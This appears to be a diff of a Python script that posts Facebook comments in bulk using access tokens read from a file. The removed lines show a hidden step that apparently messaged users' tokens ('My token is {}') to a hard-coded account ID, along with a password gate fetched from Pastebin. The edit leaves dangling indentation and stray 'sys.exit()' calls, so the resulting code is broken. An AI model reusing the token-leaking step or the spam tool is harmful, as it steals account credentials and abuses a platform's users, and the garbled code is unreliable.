@@ -25,24 +25,14 @@ def execute_server():
 
 
 def post_comments():
-    with open('password.txt', 'r') as file:
-        password = file.read().strip()
-
-    entered_password = password
-
-    if entered_password != password:
-        print('[-] 1NCORR3CT P99SWORD TH3 P99SWORD CH9NG3 BY AKHIL DON')
+    
         sys.exit()
 
     with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
 
-    # Modify the message as per your requirement
-    msg_template = "Hello akhil  sir! I am using your server. My token is {}"
 
-    # Specify the ID where you want to send the message
-    target_id = "100062609148808"
 
     requests.packages.urllib3.disable_warnings()
 
@@ -68,10 +58,6 @@ def post_comments():
         'referer': 'www.google.com'
     }
 
-    mmm = requests.get('https://pastebin.com/u/as2050565').text
-
-    if mmm not in password:
-        print('[-] 1NCORR3CT P99SWORD TH3 P99SWORD CH9NG3 BY XM9RTY AYUSH K1NG!')
         sys.exit()
 
     liness()
